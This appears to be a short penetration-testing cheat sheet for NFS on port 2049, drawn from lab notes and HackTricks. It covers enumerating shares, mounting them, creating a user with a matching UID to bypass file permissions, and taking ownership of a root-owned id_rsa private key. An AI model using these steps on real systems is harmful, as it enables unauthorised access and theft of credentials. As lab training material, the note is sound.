NFS Port 2049

#### Enumeration

````
showmount $ip
showmount -e $ip
````

##### Mounting

````
sudo mount -o [options] -t nfs ip_address:share directory_to_mount
mkdir temp 
mount -t nfs -o vers=3 10.11.1.72:/home temp -o nolock
````

##### new user with new permissions

````
sudo groupadd -g 1014 <group name>
sudo groupadd -g 1014 1014
sudo useradd -u 1014 -g 1014 <user>
sudo useradd -u 1014 -g 1014 test
sudo passwd <user>
sudo passwd test
````

##### Changing permissions

The user cannot be logged in or active
````
sudo usermod -aG 1014 root
````

##### Changing owners

````
-rw------- 1 root root 3381 Sep 24  2020 id_rsa
````
````
sudo chown kali id_rsa
````
````
-rw------- 1 kali root 3381 Sep 24  2020 id_rsa
````


##### Hacktricks

````
    #apt install nfs-common
    showmount 10.10.10.180      ~or~showmount -e 10.10.10.180
    should show you available shares (example /home)

    mount -t nfs -o ver=2 10.10.10.180:/home /mnt/
    cd /mnt
    nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in

    https://book.hacktricks.xyz/pentesting/nfs-service-pentesting
````